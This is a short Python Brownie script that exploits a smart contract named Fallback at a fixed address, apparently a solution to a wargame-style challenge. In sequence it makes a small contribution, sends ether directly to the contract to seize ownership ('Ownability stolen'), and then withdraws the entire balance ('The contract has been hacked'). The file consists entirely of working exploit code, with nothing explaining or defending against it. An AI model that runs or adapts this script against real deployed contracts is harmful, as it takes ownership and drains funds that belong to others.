from brownie import interface, config, accounts, Contract
from web3 import Web3

CONTRACT_ADDRESS = "0xb97BFF7976b93FbF76004841B26A23c35E0509E6"
ACCOUNT = accounts.add(config["wallets"]["from_key"])


def contribute():
    fallback_contract = interface.Fallback(CONTRACT_ADDRESS)

   
    contribute_tx = fallback_contract.contribute(
        {"from": ACCOUNT, "value": Web3.toWei(0.00002, "ether"), "gas_limit": 50000}
    )
    contribute_tx.wait(1)
    print("Contribution made")


def hack():
    fallback_contract = interface.Fallback(CONTRACT_ADDRESS)
    print(Contract)
    tx = ACCOUNT.transfer(fallback_contract.address,Web3.toWei(0.000002, "ether"))
    tx.wait(1)
    print("Ownability stolen")


def withdraw_all():
    fallback_contract = interface.Fallback(CONTRACT_ADDRESS)

    tx = fallback_contract.withdraw({"from": ACCOUNT})
    print("All the money is withdrow")
    print("The contract has been hacked")


def main():
    contribute()
    hack()
    withdraw_all()
